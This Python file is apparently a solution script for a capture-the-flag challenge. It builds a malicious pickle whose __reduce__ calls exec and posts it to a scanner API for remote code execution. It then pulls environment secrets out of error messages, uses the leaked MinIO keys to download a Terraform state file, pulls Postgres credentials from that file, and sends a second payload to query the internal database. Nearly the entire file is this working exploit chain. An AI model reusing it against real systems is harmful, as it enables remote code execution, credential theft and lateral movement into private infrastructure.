import asyncio
import base64
import json
import pickle
from pprint import pformat
from typing import Any

import structlog
from faker import Faker
from httpx import AsyncClient
from minio import Minio, S3Error

logger = structlog.stdlib.get_logger()
fake = Faker()


class ScannerExploit:
    def __init__(self, payload: str):
        self.payload = payload

    def __reduce__(self):
        return exec, (self.payload,)

    def create_scanner_payload(self) -> str:
        return base64.b64encode(pickle.dumps(self)).decode()


async def main():
    async with AsyncClient(
        base_url="http://api.badgescan.valverde.vote:8000"
    ) as api_client:
        structlog.contextvars.bind_contextvars(api_url=str(api_client.base_url))

        # Getting the environment variables

        with open("env_payload.py") as fd:
            payload = fd.read()
            exploit = ScannerExploit(payload)

        await logger.adebug("Sending exploit...")

        res = await api_client.post(
            "/scanner/", json={"data": exploit.create_scanner_payload()}
        )

        await logger.adebug("Initial RCE complete.")

        structlog.contextvars.unbind_contextvars("api_url")

        error = res.json()["error"].strip()

        last_error_line: str = error.split("\n")[-1]
        env_collection = last_error_line.removeprefix("RuntimeError: ").split(
            "\x00"
        )
        env_vars: dict[str, str] = dict()
        for env_pair in env_collection:
            env_pair = env_pair.strip()
            if not env_pair:
                continue
            name, value = env_pair.split("=")
            env_vars[name] = value

        await logger.adebug("Environment variables obtained.", **env_vars)

        minio_access_key = env_vars.get("MINIO_ACCESS_KEY", "")
        minio_secret_key = env_vars.get("MINIO_SECRET_KEY", "")
        minio_endpoint = env_vars.get("MINIO_ENDPOINT", "")
        flag = env_vars.get("FLAG", "")

        await logger.ainfo("FLAG OBTAINED: %s", flag)

        # Finding the internal database

        minio_client = Minio(
            minio_endpoint,
            access_key=minio_access_key,
            secret_key=minio_secret_key,
            secure=False,
        )

        buckets = minio_client.list_buckets()

        for bucket in buckets:
            await logger.ainfo("Bucket found: %s", bucket.name)

        target_bucket = "terraform"

        terraform_objects = minio_client.list_objects(bucket_name=target_bucket)

        for file in terraform_objects:
            await logger.ainfo(
                "Object found in bucket '%s': %s",
                target_bucket,
                file.object_name,
            )

        target_object = "terraform.tfstate"

        file_data = minio_client.get_object(target_bucket, target_object).read()

        terraform_state = json.loads(file_data.decode())

        internal_db_hostname = ""

        for resource in terraform_state.get("resources", []):
            resource_name = resource.get("name", "Name not found")
            resource_type = resource.get("type")
            await logger.adebug(
                "Terraform resource found: %s",
                resource_name,
                resource_type=resource_type,
            )

            if "internal_db" not in resource_name:
                continue

            if resource.get("type") != "docker_container":
                continue

            await logger.ainfo(
                "Internal DB resource found.", name=resource_name
            )

            for instance in resource.get("instances"):
                attributes: dict[str, Any] = instance.get("attributes")
                env: list[str] = attributes.get("env", [])
                await logger.adebug("Env found:\n%s", pformat(env))
                for env_pair in env:
                    name, value = env_pair.split("=")
                    env_vars[name] = value

                internal_db_hostname = attributes.get("hostname")

        internal_db_user = env_vars.get("POSTGRES_USER", "")
        internal_db_password = env_vars.get("POSTGRES_PASSWORD", "")
        internal_db_name = env_vars.get("POSTGRES_DB", "")
        await logger.adebug(
            "Processed Terraform state.",
            internal_db_user=internal_db_user,
            internal_db_password=internal_db_password,
            internal_db_hostname=internal_db_hostname,
            internal_db_name=internal_db_name,
        )

        # Looking through the database

        with open("db_payload.py") as fd:
            payload = fd.read().format(
                user=internal_db_user,
                host=internal_db_hostname,
                password=internal_db_password,
                database=internal_db_name,
            )
            exploit = ScannerExploit(payload)

        await logger.adebug("Sending exploit...")

        res = await api_client.post(
            "/scanner/", json={"data": exploit.create_scanner_payload()}
        )

        await logger.adebug("Database exploit complete.", **res.json())


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except S3Error as e:
        logger.exception("MinIO error: %s", str(e))
    except Exception as e:
        logger.exception(str(e))
